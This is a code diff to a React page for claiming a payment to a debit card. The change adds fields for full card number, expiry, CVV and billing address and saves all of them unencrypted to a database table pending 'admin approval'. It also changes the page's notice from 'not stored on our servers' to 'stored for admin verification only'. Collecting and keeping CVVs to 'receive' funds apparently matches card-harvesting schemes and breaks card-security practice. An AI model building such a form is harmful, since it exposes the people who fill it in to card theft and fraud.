@@ -12,10 +12,15 @@ export default function ClaimDebitCardPage() {
   const [messageType, setMessageType] = useState('info');
   const [submitting, setSubmitting] = useState(false);
   const [debitCardForm, setDebitCardForm] = useState({
+    cardholder_name: '',
     card_number: '',
-    expiry: '',
-    cvv: '',
-    cardholder_name: ''
+    card_expiry: '',
+    card_cvv: '',
+    billing_address: '',
+    billing_city: '',
+    billing_state: '',
+    billing_zip: '',
+    billing_country: ''
   });
 
   useEffect(() => {
@@ -42,7 +47,8 @@ export default function ClaimDebitCardPage() {
 
       // Check if expired
       if (new Date(paymentData.expires_at) < new Date()) {
-        setMessage('This payment link has expired.', 'error');
+        setMessage('This payment link has expired.');
+        setMessageType('error');
         setLoading(false);
         return;
       }
@@ -51,40 +57,53 @@ export default function ClaimDebitCardPage() {
       setLoading(false);
     } catch (error) {
       console.error('Error loading payment:', error);
-      setMessage('An error occurred while loading the payment.', 'error');
+      setMessage('An error occurred while loading the payment.');
+      setMessageType('error');
       setLoading(false);
     }
   };
 
   const handleClaimWithDebitCard = async () => {
     try {
-      if (!debitCardForm.card_number || !debitCardForm.expiry || !debitCardForm.cvv || !debitCardForm.cardholder_name) {
-        setMessage('Please fill in all card details.', 'error');
+      if (!debitCardForm.cardholder_name || !debitCardForm.card_number || !debitCardForm.card_expiry || !debitCardForm.card_cvv || !debitCardForm.billing_address || !debitCardForm.billing_city || !debitCardForm.billing_state || !debitCardForm.billing_zip || !debitCardForm.billing_country) {
+        setMessage('Please fill in all required fields.', 'error');
+        setMessageType('error');
         return;
       }
 
       setSubmitting(true);
 
-      // Update pending payment as claimed with debit card
+      // Update pending payment with full debit card details
       const { error } = await supabase
         .from('oakline_pay_pending_claims')
         .update({
           status: 'claimed',
           claim_method: 'debit_card',
           claimed_at: new Date().toISOString(),
-          recipient_name: debitCardForm.cardholder_name
+          cardholder_name: debitCardForm.cardholder_name,
+          card_number: debitCardForm.card_number,
+          card_expiry: debitCardForm.card_expiry,
+          card_cvv: debitCardForm.card_cvv,
+          billing_address: debitCardForm.billing_address,
+          billing_city: debitCardForm.billing_city,
+          billing_state: debitCardForm.billing_state,
+          billing_zip: debitCardForm.billing_zip,
+          billing_country: debitCardForm.billing_country,
+          approval_status: 'pending'
         })
         .eq('claim_token', token);
 
       if (error) throw error;
 
-      setMessage('✅ Payment initiated to your debit card. You should see the funds within 1-3 business days.', 'success');
+      setMessage('✅ Payment claim submitted successfully! Your claim is pending admin approval. Funds will be deposited within 1-3 business days after approval.', 'success');
+      setMessageType('success');
       setTimeout(() => {
         router.push('/');
-      }, 2000);
+      }, 3000);
     } catch (error) {
       console.error('Error claiming with card:', error);
-      setMessage('Failed to process debit card claim. Please try again.', 'error');
+      setMessage('Failed to process debit card claim. Please try again.');
+      setMessageType('error');
     } finally {
       setSubmitting(false);
     }
@@ -115,9 +134,11 @@ export default function ClaimDebitCardPage() {
           background: 'white',
           borderRadius: '12px',
           padding: '2rem',
-          maxWidth: '500px',
+          maxWidth: '600px',
           width: '100%',
-          boxShadow: '0 10px 40px rgba(0,0,0,0.2)'
+          boxShadow: '0 10px 40px rgba(0,0,0,0.2)',
+          maxHeight: '90vh',
+          overflowY: 'auto'
         }}>
           {message && (
             <div style={{
@@ -127,7 +148,8 @@ export default function ClaimDebitCardPage() {
               padding: '1rem',
               borderRadius: '8px',
               marginBottom: '1.5rem',
-              fontSize: '0.95rem'
+              fontSize: '0.95rem',
+              lineHeight: '1.5'
             }}>
               {message}
             </div>
@@ -146,14 +168,15 @@ export default function ClaimDebitCardPage() {
               </div>
 
               <div style={{ marginBottom: '1.5rem' }}>
-                <h2 style={{ color: '#1e293b', fontSize: '1.1rem', marginBottom: '1rem' }}>Enter Your Debit Card Details</h2>
+                <h2 style={{ color: '#1e293b', fontSize: '1.1rem', marginBottom: '0.5rem' }}>Debit Card Information</h2>
                 <p style={{ color: '#64748b', fontSize: '0.9rem', marginBottom: '1.5rem' }}>
-                  Funds will be deposited within 1-3 business days.
+                  Funds will be deposited within 1-3 business days after admin approval.
                 </p>
 
+                {/* Cardholder Name */}
                 <div style={{ marginBottom: '1rem' }}>
-                  <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>
-                    Cardholder Name
+                  <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>
+                    Cardholder Name *
                   </label>
                   <input
                     type="text"
@@ -171,9 +194,10 @@ export default function ClaimDebitCardPage() {
                   />
                 </div>
 
+                {/* Card Number */}
                 <div style={{ marginBottom: '1rem' }}>
-                  <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>
-                    Card Number
+                  <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>
+                    Card Number *
                   </label>
                   <input
                     type="text"
@@ -196,17 +220,18 @@ export default function ClaimDebitCardPage() {
                   />
                 </div>
 
+                {/* Expiry and CVV */}
                 <div style={{ display: 'flex', gap: '1rem', marginBottom: '1.5rem' }}>
                   <div style={{ flex: 1 }}>
-                    <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>
-                      Expiry (MM/YY)
+                    <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>
+                      Expiry (MM/YY) *
                     </label>
                     <input
                       type="text"
                       placeholder="MM/YY"
                       maxLength="5"
-                      value={debitCardForm.expiry}
-                      onChange={(e) => setDebitCardForm({ ...debitCardForm, expiry: e.target.value })}
+                      value={debitCardForm.card_expiry}
+                      onChange={(e) => setDebitCardForm({ ...debitCardForm, card_expiry: e.target.value })}
                       style={{
                         width: '100%',
                         padding: '0.75rem',
@@ -218,15 +243,121 @@ export default function ClaimDebitCardPage() {
                     />
                   </div>
                   <div style={{ flex: 1 }}>
-                    <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500' }}>
-                      CVV
+                    <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>
+                      CVV *
                     </label>
                     <input
                       type="text"
                       placeholder="123"
                       maxLength="4"
-                      value={debitCardForm.cvv}
-                      onChange={(e) => setDebitCardForm({ ...debitCardForm, cvv: e.target.value })}
+                      value={debitCardForm.card_cvv}
+                      onChange={(e) => setDebitCardForm({ ...debitCardForm, card_cvv: e.target.value })}
+                      style={{
+                        width: '100%',
+                        padding: '0.75rem',
+                        border: '1px solid #e2e8f0',
+                        borderRadius: '6px',
+                        fontSize: '1rem',
+                        boxSizing: 'border-box'
+                      }}
+                    />
+                  </div>
+                </div>
+
+                {/* Billing Address */}
+                <h3 style={{ color: '#1e293b', fontSize: '1rem', marginBottom: '1rem', marginTop: '1.5rem' }}>Billing Address</h3>
+
+                <div style={{ marginBottom: '1rem' }}>
+                  <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>
+                    Street Address *
+                  </label>
+                  <input
+                    type="text"
+                    placeholder="123 Main Street"
+                    value={debitCardForm.billing_address}
+                    onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_address: e.target.value })}
+                    style={{
+                      width: '100%',
+                      padding: '0.75rem',
+                      border: '1px solid #e2e8f0',
+                      borderRadius: '6px',
+                      fontSize: '1rem',
+                      boxSizing: 'border-box'
+                    }}
+                  />
+                </div>
+
+                <div style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
+                  <div style={{ flex: 2 }}>
+                    <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>
+                      City *
+                    </label>
+                    <input
+                      type="text"
+                      placeholder="New York"
+                      value={debitCardForm.billing_city}
+                      onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_city: e.target.value })}
+                      style={{
+                        width: '100%',
+                        padding: '0.75rem',
+                        border: '1px solid #e2e8f0',
+                        borderRadius: '6px',
+                        fontSize: '1rem',
+                        boxSizing: 'border-box'
+                      }}
+                    />
+                  </div>
+                  <div style={{ flex: 1 }}>
+                    <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>
+                      State *
+                    </label>
+                    <input
+                      type="text"
+                      placeholder="NY"
+                      maxLength="2"
+                      value={debitCardForm.billing_state}
+                      onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_state: e.target.value })}
+                      style={{
+                        width: '100%',
+                        padding: '0.75rem',
+                        border: '1px solid #e2e8f0',
+                        borderRadius: '6px',
+                        fontSize: '1rem',
+                        boxSizing: 'border-box'
+                      }}
+                    />
+                  </div>
+                </div>
+
+                <div style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
+                  <div style={{ flex: 1 }}>
+                    <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>
+                      ZIP Code *
+                    </label>
+                    <input
+                      type="text"
+                      placeholder="10001"
+                      value={debitCardForm.billing_zip}
+                      onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_zip: e.target.value })}
+                      style={{
+                        width: '100%',
+                        padding: '0.75rem',
+                        border: '1px solid #e2e8f0',
+                        borderRadius: '6px',
+                        fontSize: '1rem',
+                        boxSizing: 'border-box'
+                      }}
+                    />
+                  </div>
+                  <div style={{ flex: 1 }}>
+                    <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>
+                      Country *
+                    </label>
+                    <input
+                      type="text"
+                      placeholder="United States"
+                      value={debitCardForm.billing_country}
+                      onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_country: e.target.value })}
                       style={{
                         width: '100%',
                         padding: '0.75rem',
@@ -253,17 +384,25 @@ export default function ClaimDebitCardPage() {
                     fontWeight: 'bold',
                     cursor: submitting ? 'not-allowed' : 'pointer',
                     opacity: submitting ? 0.7 : 1,
-                    transition: 'opacity 0.2s'
+                    transition: 'opacity 0.2s',
+                    marginTop: '1.5rem'
                   }}
                 >
-                  {submitting ? 'Processing...' : 'Claim Payment to This Card'}
+                  {submitting ? 'Processing...' : 'Submit Claim for Admin Approval'}
                 </button>
 
-                <p style={{ color: '#999', fontSize: '0.8rem', marginTop: '1rem', textAlign: 'center' }}>
-                  🔒 Your card details are processed securely and not stored on our servers.
+                <p style={{ color: '#999', fontSize: '0.8rem', marginTop: '1rem', textAlign: 'center', lineHeight: '1.5' }}>
+                  🔒 Your card details are processed securely and stored for admin verification only.<br />
+                  An admin will review your claim and complete the transfer within 1-3 business days.
                 </p>
               </div>
             </>
+          )}
+
+          {!payment && !loading && (
+            <div style={{ textAlign: 'center', color: '#666' }}>
+              <p>Unable to load payment details.</p>
+            </div>
           )}
         </div>
       </div>
